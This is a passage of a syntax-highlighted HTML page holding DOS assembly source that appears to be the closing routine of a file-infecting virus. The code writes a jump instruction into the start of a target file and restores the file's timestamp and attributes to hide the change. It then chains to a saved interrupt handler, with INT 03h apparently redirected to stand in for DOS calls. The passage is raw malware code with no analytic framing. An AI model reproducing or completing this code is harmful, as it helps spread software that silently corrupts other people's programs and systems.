     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
     </span><span class="sc6">CWD</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">
     </span><span class="sc6">JC</span><span class="sc0">  </span><span class="sc5">@WrErr</span><span class="sc0">

     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">              </span><span class="sc1">;Seek beginning of file</span><span class="sc0">
     </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">CWD</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                  </span><span class="sc1">;Write jump instruction to file</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,(</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">OurByte</span><span class="sc4">)-(</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">@Start</span><span class="sc4">)</span><span class="sc0">
     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">

</span><span class="sc5">@WrErr</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">              </span><span class="sc1">;Restore file time/date</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">     

</span><span class="sc5">@FileErr</span><span class="sc4">:</span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                </span><span class="sc1">;Close file</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">@OpenErr</span><span class="sc4">:</span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
     </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0">                   </span><span class="sc1">;Restore file attributes</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">@Wrong</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
     </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">@OldHand</span><span class="sc4">:</span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">                  </span><span class="sc1">;Jump to</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@End</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">@Begin</span><span class="sc0">
</span></div></body>
</html>
